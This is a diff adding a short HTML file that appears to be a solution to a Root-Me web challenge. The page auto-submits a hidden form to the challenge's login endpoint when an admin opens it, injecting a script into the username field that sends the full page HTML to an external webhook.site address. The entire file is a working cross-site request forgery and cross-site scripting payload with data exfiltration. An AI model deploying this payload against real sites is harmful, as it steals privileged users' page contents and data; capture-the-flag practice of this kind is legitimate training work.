@@ -1,0 +1,15 @@
+<!doctype html>
+<html>
+  <body>
+    <!-- Auto-POST to the vulnerable endpoint -->
+    <form id="f" action="http://challenge01.root-me.org:58003/login" method="POST">
+      <input type="hidden" name="username"
+        value="<script>navigator.sendBeacon('https://webhook.site/2aa1b7f4-11a8-4493-85be-cd908cedda81/?c=', new Blob([document.documentElement.outerHTML],{type:'text/plain'}));</script>">
+      <input type="hidden" name="secret" value="a">
+    </form>
+    <script>
+      // Submit immediately when the admin opens the link
+      document.getElementById('f').submit();
+    </script>
+  </body>
+</html>
